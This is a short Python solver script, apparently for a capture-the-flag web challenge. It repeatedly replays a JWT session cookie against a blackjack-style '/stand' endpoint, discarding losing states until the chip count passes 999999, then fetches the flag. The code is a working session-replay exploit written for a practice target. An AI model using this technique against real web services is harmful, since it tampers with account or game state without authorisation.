import requests


base_url = 'http://web.kosenctf.com:14001/'


def game(state):
    r = requests.post(f'{base_url}/stand', cookies={'matsushima': state})
    result = r.json()
    chip = result['chip']
    jwt = r.cookies['matsushima']

    return chip, jwt


def flag(state):
    r = requests.get(f'{base_url}/flag', cookies={'matsushima': state})
    return r.json()['flag']


def solve():
    r = requests.post(f'{base_url}/initialize')
    state = r.cookies['matsushima']

    while True:
        chip, jwt = game(state)
        if chip == 0:
            continue
        state = jwt
        if chip >= 999999:
            break

    print(flag(state))


if __name__ == '__main__':
    solve()
